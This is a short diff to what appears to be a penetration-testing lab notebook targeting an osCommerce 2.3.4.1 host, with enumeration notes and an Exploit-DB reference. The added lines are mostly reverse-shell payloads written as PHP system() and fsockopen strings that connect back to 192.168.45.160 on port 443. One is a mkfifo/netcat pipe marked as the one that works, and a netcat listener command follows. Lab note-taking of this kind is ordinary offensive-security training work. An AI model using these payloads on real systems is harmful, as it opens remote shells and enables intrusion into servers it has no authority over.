@@ -90,7 +90,18 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-wor
 # find http://192.168.213.223:60001/docs/release_notes.pdf - # osCommerce 2.3.4.1
 # find https://www.exploit-db.com/exploits/44374
 
+# Does not work
 my_shell_file = open("/home/kali/relia/shell.php")
 shell_data = my_shell_file.read()
- nc -nvlp 443
+
+# bash -e does not work
+payload += 'system("nc -e /bin/bash 192.168.45.160 443");'
+
+# doesn't work, probably not using file descriptor 3
+payload += '$sock=fsockopen("192.168.45.160",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# This one works.
+payload += 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f");'
+
+nc -nvlp 443
 ```
